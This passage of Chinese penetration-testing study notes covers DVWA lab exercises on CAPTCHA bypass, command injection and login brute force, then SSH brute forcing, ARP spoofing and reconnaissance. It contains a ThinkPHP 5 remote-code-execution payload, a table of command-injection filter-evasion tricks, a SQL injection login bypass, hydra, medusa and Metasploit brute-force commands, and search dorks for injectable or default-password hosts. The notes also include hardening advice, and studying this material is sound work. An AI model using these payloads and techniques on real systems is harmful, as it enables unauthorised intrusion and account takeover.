method=\\\"POST\\\">\n                <input type=\\\"hidden\\\" name=\\\"step\\\" value=\\\"2\\\" />\n                <input type=\\\"hidden\\\" name=\\\"password_new\\\" value=\\\"\" . $pass_new . \"\\\" />\n                <input type=\\\"hidden\\\" name=\\\"password_conf\\\" value=\\\"\" . $pass_conf . \"\\\" />\n                <input type=\\\"hidden\\\" name=\\\"passed_captcha\\\" value=\\\"true\\\" />\n                <input type=\\\"submit\\\" name=\\\"Change\\\" value=\\\"Change\\\" />\n            </form>\";\n            }    \n\n            else{\n                    echo \"<pre> Both passwords must match </pre>\";\n            $hide_form = false;\n            }\n    }\n}\n\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '2' ) ) \n{\n    $hide_form = true;\n    if (!$_POST['passed_captcha'])\n    {\n                echo \"<pre><br />You have not passed the CAPTCHA. Bad hacker, no doughnut.</pre>\";\n        $hide_form = false;\n        return;\n    }\n        $pass = md5($pass_new);\n        if (($pass_new == $pass_conf)){\n               $pass_new = mysql_real_escape_string($pass_new);\n               $pass_new = md5($pass_new);\n\n               $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n               $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n\n               echo \"<pre> Password Changed </pre>\";\n               mysql_close();\n        }\n\n        else{\n               echo \"<pre> Passwords did not match. </pre>\";\n        }\n}\n?> \n```\n\n在第二步可以看到多了一个if语句用来验证验证码，要求 $_POST['passed_captcha']为真。只要在修改包的时候多添加一个参数passed_captcha=true即可。\n\n## 6.3 不安全验证码[高]\n\n```php\n <?php\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '1' ) ) {\n    \n    $hide_form = true;\n    \n        $pass_new = $_POST['password_new'];\n    $pass_new = stripslashes( $pass_new );\n    $pass_new = mysql_real_escape_string( $pass_new );\n    $pass_new = md5( $pass_new );\n\n        $pass_conf = $_POST['password_conf'];\n        $pass_conf = stripslashes( $pass_conf );\n    $pass_conf = mysql_real_escape_string( $pass_conf );\n    $pass_conf = md5( $pass_conf );\n    \n        $resp = recaptcha_check_answer ($_DVWA['recaptcha_private_key'],\n        $_SERVER[\"REMOTE_ADDR\"],\n        $_POST[\"recaptcha_challenge_field\"],\n        $_POST[\"recaptcha_response_field\"]);\n\n    if (!$resp->is_valid) {\n        // What happens when the CAPTCHA was entered incorrectly\n        echo \"<pre><br />The CAPTCHA was incorrect. Please try again.</pre>\";\n        $hide_form = false;\n        return;    \n    } else {\n                // Check that the current password is correct\n        $qry = \"SELECT password FROM `users` WHERE user='admin' AND password='$pass_curr';\";\n        $result = mysql_query($qry) or die('<pre>' . mysql_error() . '</pre>' );\n                \n                if (($pass_new == $pass_conf)  && ( $result && mysql_num_rows( $result ) == 1 )){\n                       $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n                       $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n\n                       echo \"<pre> Password Changed </pre>\";\n                       mysql_close();\n                }\n\n                else{\n                       echo \"<pre> Either your current password is incorrect or the new passwords did not match. Please try again. </pre>\";\n                }\n    }\n}\n?> \n```\n\n这种加上原密码再加上验证基本很难攻击。\n\n# 7. 命令执行漏洞\n\n```\nwindows或linux下：\ncommand1 && command2\t先执行1再执行2\ncommand1 || command2\t先执行1，1为假再执行2\ncommand1 & command2\t\t先执行2再执行1\ncommand1 | command2\t\t只执行2\n```\n\n在过滤情况下的解决办法：\n\n| 过滤关键字  | 解决方法                                  | 备注                                                         |\n| ----------- | ----------------------------------------- | ------------------------------------------------------------ |\n| cat         | ca\\t、ca''t、a=c;b=at;\\$a$b xxx、less xxx |                                                              |\n| 空格        | \\$IFS\\$9、<、<>、%20(space)、%09(tab)     | \\$IFS是bash中的内部域分隔符，可以代替空格。后面的$9数字是可以随意的，每个数字都有特殊含义，但是和前面的搭配都可以表示空格。 |\n| 目录分隔符/ | cd flag文件所在目录后在cat flag文件       | ls后用反斜杠\\查看目录里的文件，比如：ls \\flag_is_here        |\n| &、\\|       | 用；来分隔命令                            |                                                              |\n| ；          | %0a                                       |                                                              |\n| flag        | fla*                                      | 不用知道flag的具体名字                                       |\n\n## 7.1 ThinkPHP 5漏洞\n\npayload\n\n```\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag\n```\n\n## 7.2 命令执行漏洞[低]\n\n查看源码：\n\n```php\n<?php\n\nif( isset( $_POST[ 'submit' ] ) ) {\n\n    $target = $_REQUEST[ 'ip' ];\n\n    // Determine OS and execute the ping command.\n    if (stristr(php_uname('s'), 'Windows NT')) { \n    \n        $cmd = shell_exec( 'ping  ' . $target );\n        echo '<pre>'.$cmd.'</pre>';\n        \n    } else { \n    \n        $cmd = shell_exec( 'ping  -c 3 ' . $target );\n        echo '<pre>'.$cmd.'</pre>';\n        \n    }\n    \n}\n?> \n```\n\n这段代码相当于cmd的ping功能：\n\n```\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.008 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.022 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.019 ms\n\n--- 127.0.0.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2011ms\nrtt min/avg/max/mdev = 0.008/0.016/0.022/0.006 ms\n```\n\n但如果利用合并命令，可以执行ping以外的其他功能，例如**127.0.0.1&&pwd**：\n\n```\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.008 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.017 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.017 ms\n\n--- 127.0.0.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2019ms\nrtt min/avg/max/mdev = 0.008/0.014/0.017/0.004 ms\n/owaspbwa/dvwa-git/vulnerabilities/exec\n```\n\npwd 命令用作显示工作目录的路径名称 。\n\n## 7.2 命令执行漏洞[中]\n\n查看源码：\n\n```php\n<?php\n\nif( isset( $_POST[ 'submit'] ) ) {\n\n    $target = $_REQUEST[ 'ip' ];\n\n    // Remove any of the charactars in the array (blacklist).\n    $substitutions = array(\n        '&&' => '',\n        ';' => '',\n    );\n\n    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );\n    \n    // Determine OS and execute the ping command.\n    if (stristr(php_uname('s'), 'Windows NT')) { \n    \n        $cmd = shell_exec( 'ping  ' . $target );\n        echo '<pre>'.$cmd.'</pre>';\n        \n    } else { \n    \n        $cmd = shell_exec( 'ping  -c 3 ' . $target );\n        echo '<pre>'.$cmd.'</pre>';\n        \n    }\n}\n\n?> \n```\n\n代码是将&&和；都替换成空，但我们可以用||，只要前面条件为假，就执行后面的命令。例如：**hello || ls**\n\n```\nhelp\nindex.php\nsource\n```\n\n## 7.3 命令执行漏洞[高]\n\n```php\n<?php\n\nif( isset( $_POST[ 'submit' ] ) ) {\n\n    $target = $_REQUEST[\"ip\"];\n    \n    $target = stripslashes( $target );\n    \n    \n    // Split the IP into 4 octects\n    $octet = explode(\".\", $target);\n    \n    // Check IF each octet is an integer\n    if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) && (is_numeric($octet[3])) && (sizeof($octet) == 4)  ) {\n    \n    // If all 4 octets are int's put the IP back together.\n    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];\n    \n    \n        // Determine OS and execute the ping command.\n        if (stristr(php_uname('s'), 'Windows NT')) { \n    \n            $cmd = shell_exec( 'ping  ' . $target );\n            echo '<pre>'.$cmd.'</pre>';\n        \n        } else { \n    \n            $cmd = shell_exec( 'ping  -c 3 ' . $target );\n            echo '<pre>'.$cmd.'</pre>';\n        \n        }\n    \n    }\n    \n    else {\n        echo '<pre>ERROR: You have entered an invalid IP</pre>';\n    }\n    \n    \n}\n\n?> \n```\n\n对获取的ip值，先去下划线处理，然后根据’.’来分成数组，判断是否分成四份且每一份是数字的，然后还原回去，对ip值进行ping操作，否则判定输入ip值为非法ip格式。经过这样的处理，输入的只能是ip格式的参数，确保了执行输入参数的安全性。 \n\n# 8. 暴力破解\n\n暴力破解的关键是字典。用crunch生成字典：\n\n```\ncrunch [min] [max] [characters] -t[patterns] -o[filename]\n\ncrunch 6 8 abc123q -t a@@@@b -o test.txt\n创建一个至少6个字符，至多8个字符，由abc123q生成的由a开头由b结尾的test.txt字典。\n```\n\n## 8.1 网页密码暴力破解[低]\n\n```\nburp suite\n```\n\n查看源码：\n\n```php\n<?php\n\nif( isset( $_GET['Login'] ) ) {\n\n    $user = $_GET['username'];\n    \n    $pass = $_GET['password'];\n    $pass = md5($pass);\n\n    $qry = \"SELECT * FROM `users` WHERE user='$user' AND password='$pass';\";\n    $result = mysql_query( $qry ) or die( '<pre>' . mysql_error() . '</pre>' );\n\n    if( $result && mysql_num_rows( $result ) == 1 ) {\n        // Get users details\n        $i=0; // Bug fix.\n        $avatar = mysql_result( $result, $i, \"avatar\" );\n\n        // Login Successful\n        echo \"<p>Welcome to the password protected area \" . $user . \"</p>\";\n        echo '<img src=\"' . $avatar . '\" />';\n    } else {\n        //Login failed\n        echo \"<pre><br>Username and/or password incorrect.</pre>\";\n    }\n\n    mysql_close();\n}\n\n?> \n```\n\n代码很简单，用户输入账号密码后，将用户的密码进行MD5加密，从数据库中找相应的账号密码与之对比，相与为1的话输出用户名和头像。\n\n我们随便输入账号密码，用burpsuite拦截数据包。在burpsuite中右键将包发送至intruder模块。进入intruder的positions模块，选择需要爆破的变量，需要爆破的变量前后面都加$，选择攻击类型：\n\n```\nSniper – 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。\n\nBattering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中\n\nPitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量\n\nCluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。\n```\n\n选择cluster bomb，再在payloads模块的payload options添加字典。爆破出结果。\n\n第二种方法是SQL注入，从源码看到没有对username和password进行过滤。当试到6个字段的时候，它说成功进入：\n\n```\n' union select 1,2,3,4,5,6 -- d\n\nWelcome to the password protected area ' union select 1,2,3,4,5,6 -- d\n```\n\n## 8.2 网页密码暴力破解[中]\n\n查看源码：\n\n```php\n<?php\n\nif( isset( $_GET[ 'Login' ] ) ) {\n\n    // Sanitise username input\n    $user = $_GET[ 'username' ];\n    $user = mysql_real_escape_string( $user );\n\n    // Sanitise password input\n    $pass = $_GET[ 'password' ];\n    $pass = mysql_real_escape_string( $pass );\n    $pass = md5( $pass );\n\n    $qry = \"SELECT * FROM `users` WHERE user='$user' AND password='$pass';\";\n    $result = mysql_query( $qry ) or die( '<pre>' . mysql_error() . '</pre>' );\n\n    if( $result && mysql_num_rows($result) == 1 ) {\n        // Get users details\n        $i=0; // Bug fix.\n        $avatar = mysql_result( $result, $i, \"avatar\" );\n\n        // Login Successful\n        echo \"<p>Welcome to the password protected area \" . $user . \"</p>\";\n        echo '<img src=\"' . $avatar . '\" />';\n    } else {\n        //Login failed\n        echo \"<pre><br>Username and/or password incorrect.</pre>\";\n    }\n\n    mysql_close();\n}\n\n?> \n```\n\n mysqli_real_escape_string()会将转义特殊字符，一定程度上防止SQL注入。 所以用[低]的burpsuite方法解决。\n\n## 8.3 网页密码暴力破解[高]\n\n查看源码：\n\n```php\n <?php\n\nif( isset( $_GET[ 'Login' ] ) ) {\n\n    // Sanitise username input\n    $user = $_GET[ 'username' ];\n    $user = stripslashes( $user );\n    $user = mysql_real_escape_string( $user );\n\n    // Sanitise password input\n    $pass = $_GET[ 'password' ];\n    $pass = stripslashes( $pass );\n    $pass = mysql_real_escape_string( $pass );\n    $pass = md5( $pass );\n\n    $qry = \"SELECT * FROM `users` WHERE user='$user' AND password='$pass';\";\n    $result = mysql_query($qry) or die('<pre>' . mysql_error() . '</pre>' );\n\n    if( $result && mysql_num_rows( $result ) == 1 ) {\n        // Get users details\n        $i=0; // Bug fix.\n        $avatar = mysql_result( $result, $i, \"avatar\" );\n\n        // Login Successful\n        echo \"<p>Welcome to the password protected area \" . $user . \"</p>\";\n        echo '<img src=\"' . $avatar . '\" />';\n    } else {\n        // Login failed\n        sleep(3);\n        echo \"<pre><br>Username and/or password incorrect.</pre>\";\n        }\n\n    mysql_close();\n}\n\n?> \n```\n\n还是可以用burpsuite解决，但每次登录失败都要sleep3秒，大大降低破解速度。\n\n## 8.4 SSH密码暴力破解\n\n### 8.4.1 hydra\n\n```\n世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。\n```\n\n```\nExamples:\n  hydra -l user -P passlist.txt ftp://192.168.0.1\n  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN\n  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5\n  hydra -l admin -p password ftp://[192.168.0.0/24]/\n  hydra -L logins.txt -P pws.txt -M targets.txt ssh\n  hydra -L logins.txt -P pws.txt -M targets.txt ssh -o ssh-hydra.ok\n```\n\n### 8.4.2 medusa\n\n```\n速度快，支持大规模并行，模块化，爆破登录，可以同时对多个主机、用户或密码执行强力测试。medusa和hydra一样，同样属于在线密码破解工具。不同的是，medusa的稳定性相较于hydra要好很多，但其支持模块要比hydra少一些。\n```\n\n```\nmedusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]\n\nmedusa -M ssh -H hostlist.txt -U userlist.txt -P passlist.txt -O ssh.log\n```\n\n### 8.4.3 patator\n\n```\npatator ssh_login host=192.168.137.147 user=root password=FILE0 0=passlist.txt -x ignore:mesg='Authentication failed'\n```\n\n### 8.4.5 brutespray\n\n```\nbrutepray是一款基于nmap扫描输出的gnmap/XML文件，自动调用medusa对服务进行爆破。\n```\n\nkali安装brutespray\n\n```\napt-get update\napt-get install brutespray\n```\n\nbrutespray语法参数\n\n```\n  -f FILE, --file FILE  GNMAP, JSON or XML file to parse\n  -o OUTPUT, --output OUTPUT\n                        Directory containing successful attempts\n  -s SERVICE, --service SERVICE\n                        specify service to attack\n  -t THREADS, --threads THREADS\n                        number of medusa threads\n  -T HOSTS, --hosts HOSTS\n                        number of hosts to test concurrently\n  -U USERLIST, --userlist USERLIST\n                        reference a custom username file\n  -P PASSLIST, --passlist PASSLIST\n                        reference a custom password file\n  -u USERNAME, --username USERNAME\n                        specify a single username\n  -p PASSWORD, --password PASSWORD\n                        specify a single password\n  -c, --continuous      keep brute-forcing after success\n  -i, --interactive     interactive mode\n  -m, --modules         dump a list of available modules to brute\n  -q, --quiet           supress banner\n```\n\n### 8.4.6 msf\n\n```\nmetasploit framework是一个编写、测试和使用exploit代码的完善环境。这个环境为渗透测试，shellcode编写和漏洞研究提供了一个可靠的平台，这个框架主要是由面向对象的perl编程语言编写的，并带有由C语言，汇编程序和Python编写的可选组件。\n```\n\n#### 8.4.6.1. SSH模块\n\n```\n┌──(root💀kali)-[~]\n└─# msfconsole\nmsf6 > search ssh\n```\n\n#### 8.4.6.2. SSH用户枚举\n\n```\nmsf6 > use auxiliary/scanner/ssh/ssh_enumusers\nmsf6 auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 192.168.137.147\nmsf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /root/userlist.txt\nmsf6 auxiliary(scanner/ssh/ssh_enumusers) > run\n```\n\n#### 8.4.6.3. SSH版本探测\n\n```\nmsf6 > use auxiliary/scanner/ssh/ssh_version\nmsf6 auxiliary(scanner/ssh/ssh_version) > set rhosts 192.168.137.147\nmsf6 auxiliary(scanner/ssh/ssh_version) > run\n```\n\n#### 8.4.6.4. SSH暴力破解\n\n```\nmsf6 > use auxiliary/scanner/ssh/ssh_login\nmsf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.137.147\nmsf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /root/userlist.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /root/passlist.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > run\n```\n\n\n\n### 8.4.7 burpsuite\n\n8.1-8.3用的就是burpsuite暴力破解的例子。\n\n## 8.5 暴力破解防御\n\n```\n1.sueradd shell[推荐]\nuseradd v5le0n9 -s /sbin/nologin\n\n2.密码的复杂性[推荐]\n字母大小写+数字+特殊字符+20位以上+定期更换\n\n3.修改默认端口[推荐]\n/etc/ssh/sshd_config\nport 22222\n\n4.限制登录的用户或组[推荐]\n#permitrootlogin yes\nallowusers v5le0n9\n\nman sshd_config\nallowusers allowgroups denyusers denygroups\n\n5.使用sudo，不用root用户[推荐]\n\n6.设置允许的IP访问[可选]\n/etc/hosts.alllow，例如sshd:192.168.137.147:allow\nPAM基于IP限制\niptables/firewalld\n只能允许从堡垒机访问\n\n7.使用denyhosts自动统计，并将其加入到/etc/hosts.deny\n\n8.基于PAM实现登录限制[推荐]\n模块：pam_tally2.so\n功能：登录统计\n示例：实现防止对sshd暴力破解\ngrep tally2 /etc/pam.d/sshd\nauth required pam_tally2.so deny=2 even_deny_root root_unlock_time=60 unlock_time=6\n\n9.禁用密码改用公钥方式认证\n/etc/ssh/ssh_config\npasswordauthentication no\n\n10.保护shell导出会话文件[小心]\n\n11.GRUB加密[针对本地破解]\n```\n\n# 9. 中间人攻击\n\n利用ARP，ARP是地址解析协议，将IP地址转化为MAC地址。\n\nkali抓包\n\n```\ntcpdump -i eth0 -nn arp\tand host 192.168.137.147 抓ARP协议包\n```\n\n```\nettercap -G\t图形化\n```\n\n使用静态IP/MAC防止中间人攻击(windows下)\n\n```\nnetsh i i show in\t查看本地网络IDX值\nnetsh -c \"i i\" add ne idx值 192.168.137.147 00-aa-00-62-6-c6-09\t永久绑定\narp -a\t查看是否绑定成功\nnetch -c \"i i\" delete neighbors idx值\t删除绑定的IP/MAC\n```\n\nLinux下\n\n```\narp -s 192.168.137.147 00-aa-00-62-6-c6-09\n```\n\n# 10. WEB信息收集\n\n## 10.1 网络信息收集的内容\n\n### 10.1.1. 网络攻击信息收集\n\n入手点：目标的名称和域名\n\n攻击准备阶段：\n\n- 在网络中的“地理位置”\n- 与真实世界的联系(实施社工和物理攻击)\n- “网络地图”\n- 攻击所需的更详细信息\n\n攻击实施阶段：\n\n- 目标系统中存在的安全缺陷和漏洞\n- 目标系统的安全防护机制\n\n### 10.1.2. 网络防御信息收集\n\n追查入侵者的身份、网络位置、所攻击的目标、采用的攻击方法等\n\n一般被归入取证与追踪技术范畴\n\n## 10.2 信息收集的方式\n\n1. 主动信息收集\n\n- 通过直接访问、扫描网站，这种流量将流经网站。\n- 能获取更多的信息， 但目标主机可能会记录操作记录。\n\n2. 被动信息收集\n\n- 利用第三方的服务对目标进行访问了解，如搜索引擎等。\n- 收集的信息会相对较少，但是行动并不会被目标主机发现。\n\n## 10.3 信息收集的技术方法\n\n$$\n\\begin{cases}踩点\\begin{cases}Web搜索与挖掘\\\\DNS和IP查询\\\\网络拓扑和侦察\\end{cases}\\\\扫描\\begin{cases}主机扫描\\\\端口扫描\\\\系统类型探查\\\\漏洞扫描\\end{cases}\\\\查点\\begin{cases}旗标抓取\\\\网络服务查点\\end{cases}\\end{cases}\n$$\n\n### 10.3.1 网络踩点技术\n\n#### 10.3.1.1. 踩点\n\n- 有计划、有步骤的信息情报收集\n- 了解攻击目标的网络环境和信息安全装库啊\n- 得到攻击目标剖析图\n\n#### 10.3.1.2. 踩点目的\n\n- 通过对完整剖析图的细致分析\n- 攻击者将会从中寻找出攻击目标可能存在的薄弱环节\n- 为进一步的攻击行动提供指引\n\n#### 10.3.1.3. 踩点针对的信息\n\n##### 10.3.1.3.1 目标组织\n\n- 具体使用的域名\n- 网络地址范围\n- 因特网上可直接访问的IP地址与网络服务\n- 网络拓扑结构及软硬件\n- 电话号码段\n- 电子邮件列表\n- 信息安全状况\n\n##### 10.3.1.3.2 目标个人\n\n- 身份信息、联系方式、职业经历、甚至一些个人隐私信息\n\n#### 10.3.1.4. 踩点技术手段\n\n##### 10.3.1.4.1 Web信息搜索与挖掘\n\n对目标组织或个人的大量公开或意外泄漏的Web信息进行挖掘。\n\n###### 10.3.1.4.1.1. Google Hacking\n\n```\n#site\n功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。\nsite:zhihu.com\t\t\t\t搜索跟zhihu.com相关的网页\n\"web安全\" site:zhihu.com\t\t搜索zhihu.com跟web安全相关的内容\n\"sql注入\" site:csdn.net\t\t在csdn.net搜索跟SQL注入相关的内容\n\"教程\" site:pan.baidu.com\t\t在百度盘搜索教程\n```\n\n```\n#filetype\n功能：搜索指定文件类型\n\"web安全\" filetype:pdf\t\t搜索跟web安全有关的pdf文件\nnamp filetype:ppt\t\t\t搜索跟nmap相关的ppt文件\nsite:csdn.net filetype:pdf\t搜索csdn网站中的pdf文件\n```\n\n```\n#inurl\n功能：搜索url网址存在特定关键字的网页，可以用来搜寻有注入点的网站\ninurl:.php?id=\t\t\t\t搜索网址中有\".php?id=\"的网页\ninurl:view.php=?\t\t\t搜索网址中有\"view.php=?\"的网页\ninurl:.jsp?id=\t\t\t\t搜索网址中有\".jsp?id=\"的网页\ninurl:.asp?id=\t\t\t\t搜索网址中有\".asp?id=\"的网页\ninurl:/admin/login.php\t\t搜索网址中有\"/admin/login.php\"的网页\ninurl:login\t\t\t\t\t搜索网址中有\"login\"的登录网页\n```\n\n```\n#intitle\n功能：搜索标题存在特点关键字的网页\nintitle:后台登录\t\t\t\t\t\t\t\t搜索网页标题是\"后台登录\"的网页\nintitle:后台管理 filetype:php\t\t\t\t\t搜索网页标题是\"后台管理\"的php页面\nintitle:index of \"parent directory\"\t\t   \t   搜索根目录相关的索引目录信息\n```\n\n```\n#intext\n功能：搜索正文存在特定关键字的网页\nintext:powered by Discuz\t\t\t搜索Discuz论坛相关的页面\nintext:powered by wordpress\t\t\t搜索wordpress制作的博客网址\nintext:powered by *CMS\t\t\t\t搜索基于*CMS的网址，CMS是内容管理系统，建站系统\nintext:powered by xxx inurl:login\t搜索此类网址的后台登录页面\t\n```\n\n```\n#符号\n-keyword\t\t强制结果不要出现此关键字，例如：电影 -黑客\n*keyword\t\t模糊搜索，强制结果包含此关键字，例如：电影 一个叫*决定*\n\"keyword\"\t\t强制搜索结果整体出现此关键字，例如：书籍 \"web安全\"\n```\n\n```\n#快捷键\nCtrl + F\t\t想要在页面中查找某关键字的位置\nCtrl + +/-/0\t放大、缩小页面，0是回到100%\nCtrl + L\t\t选中页面中的地址栏\nCtrl + Tab\t\t切换标签页\nAlt + Tab\t\t切换窗口\n```\n\n例：搜纽约时报网站(nytimes.com)在2008年到2010年关于大学(college)测验分数(test scores)但不是SAT入学分数的文章。\n\n```\nsite:nytimes.com ~college \"test scores\" -SATs 2008..2010\nsite:nytimes.com\t//只搜索某个网站的页面\n~college\t\t\t//同时搜索近义词比如university,higher education\n\"test scores\"\t\t//整体作为关键词\n-SATs\t\t\t\t//排除SATs\n2008..2010\t\t\t//显示指定年份时间段内的搜索结果\n```\n\n###### 10.3.1.4.2. Shodan Hacking\n\n```\nhttp://www.shodan.io\nShodan(撒旦搜索引擎)被称为“最可怕的搜索引擎”，可扫描一切联网的设备。除了常见的web服务器，还能扫描防火墙、路由器、交换机、摄像头、打印机等一切联网设备。\n```\n\n```\n#ip\n114.114.114.114\n```\n\n```\n#service/protocol\nhttp\nhttp country:\"DE\"\t\t使用高级搜索要注册登录才能搜索\nhttp product:\"Apache httpd\"\n\nssh\nssh default password\nssh default password country:\"JP\" city:\"Tokyo\"\n```\n\n```\n#keyword\n基于关键词搜索的思路是根据banner(设备指纹)来搜索\n\"default password\" country:\"TH\"\nFTP anon successful\n```\n\n```\n#product\nproduct:\"Microsoft IIS httpd\"\nproduct:\"nginx\"\nproduct:\"Apache httpd\"\nproduct:MySQL\n```\n\n```\n#version\nproduct:MySQL version:\"5.1.73\"\nproduct:\"Microsoft IIS httpd\" version:\"7.5\"\n```\n\n```\n#hostname\nhostname:.org\nhostname:.edu\n```\n\n```\n#os\nos:\"Windows Server 2008 R2\"\nos:\"Windows 7 or 8\"\nos:\"Linux 2.6.x\"\n```\n\n```\n#net\nnet:110.180.13.0/24\n200 ok net:110.180.13.0/24\n200 ok country:JP net:110.180.13.0/24\n```\n\n```\n#port\nport:3389\nport:445\nport:22\n```\n\n远程桌面连接mstsc，好像要Win10专业版才行。\n\n###### 10.3.1.4.3. Zoomeye Hacking\n\n```\nhttps://www.zoomeye.org\nZoomEye(钟馗之眼)是一个面向网络空间的搜索引擎，“国产的shodan”。\n\nip\t\t\tip:35.185.77.2\nos\t\t\tos:linux\napp\t\t\tapp:Apache httpd\nservice\t\tservice:routersetup\t公网路由器\nport\t\tport:3389\ncountry\t\tcountry:cn\ncity\t\tcountry:cn +city:hangzhou\nver\t\t\tapp:Apache httpd +ver:2.2.16\ncidr\t\tcidr:35.185.77.2/24\t\tIP的CIDR网段\nhostname\thostname:google.com\t\nsite\ntitle\nheader\nkeywords\ndesc\n\n用户手册：https://www.zoomeye.org/help\n```\n\n###### 10.3.1.4.1.4 元搜索引擎\n\n集成多个搜索引擎进行信息收集\n\n基于元搜索引擎实现被篡改网站发现\n\n{% asset_img 元搜索引擎.jpg 元搜索引擎 %}\n\n###### 10.3.1.4.1.5 防范措施\n\n- 注意组织安全敏感信息以及个人隐私信息不要在因特网上随意发布\n- 个人上网时尽量保持匿名\n- 提供个人隐私信息时，应选择具有良好声誉并可信任的网站\n- 定期对自身单位及个人在Web上的信息足迹进行搜索\n\n##### 10.3.1.4.2 DNS与IP查询\n\n###### 10.3.1.4.2.1 Whois查询\n\nwhois是用来查询域名注册所有者等信息的传输协议。\n\n通过 whois 来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS 解析服务器、注册人联系电话等等，可以进行邮箱反查域名，爆破邮箱，社工，域名劫持，寻找旁站等等。\n\nhttp://whois.chinaz.com/\n\n###### 10.3.1.4.2.2 备案信息\n\n网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等）。\n\n利用技巧：\n\n- DNS解析记录可以反查 IP，比较早的解析记录有时可以查到真实 IP，需要留意一下。\n- 注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。\n\nhttps://icp.chinaz.com/\n\n###### 10.3.1.4.2.3 DNS服务：从DNS到IP的映射\n\n先了解一下域名层级：以百度为例子：www.baidu.com。依次是com(顶级域名)、baidu(一级域名)、www(二级域名)。但是实质上还有一个唯一的根域名root：www.baidu.com.root，但由于root是唯一的，因此是否写root根域名不是特别必要。\n\nDNS查询工具：\n\n系统自带：nslookup(Windows)、dig(Linux)\n\n```\n>nslookup www.gzhu.edu.cn\n服务器:  UnKnown\nAddress:  202.192.18.10\n\n名称:    gzhu-edu-cn.cname.saaswaf.com\nAddresses:  2001:250:100d:ffac:121:194:14:82\n          2001:250:100d:ffac:121:194:14:83\n          2001:da8:2032:1006:10:0:213:50\n          2001:da8:2032:1006:10:0:213:51\n          58.205.213.52\n          121.194.14.85\n          121.194.14.84\nAliases:  www.gzhu.edu.cn\n```\n\n###### 10.3.1.4.2.4 IP->location查询\n\nIP地址到现实世界中的具体地理位置。\n\n域名->IP地址->地理位置\n\nhttps://cz88.net/\n\n###### 10.3.1.4.2.5 防范措施\n\n- 公用数据库中提供信息的安全问题\n\n  - 必须向注册机构提供尽可能准确的信息\n\n- 采用一些安防措施不让攻击者轻易得手\n\n  - 及时更新管理性事务联系人的信息\n\n  - 尝试使用虚构的人名来作为管理性事务联系人\n\n    HoneyMan：帮助发现和追查那些在电话或邮件中试图冒充虚构人名的“社会工程师”。\n\n  - 慎重考虑所列的电话号码和地址等信息\n\n  - 注意域名注册机构允许更新注册信息的方式，并确保其中关键信息的安全\n\n##### 10.3.1.4.3 网络侦察\n\n###### 10.3.1.4.3.1 Traceroute路由追踪\n\n- 探测网络路由路径，可用于确定网络拓扑\n- 主机发送TTL从1开始逐步增1的IP包，网络路径上路由器返回ICMP TIME_EXECEEDED\n- UNIX/Linux: traceroute\n  Windows: tracert\n- 穿透防火墙: traceroute-S -p53 TARGET_IP\n- 图形化界面工具: VisualRoute, NeoTrace, Trout\n\n```\n>tracert www.gzhu.edu.cn\n\n通过最多 30 个跃点跟踪\n到 gzhu-edu-cn.cname.saaswaf.com [121.194.14.84] 的路由:\n\n  1     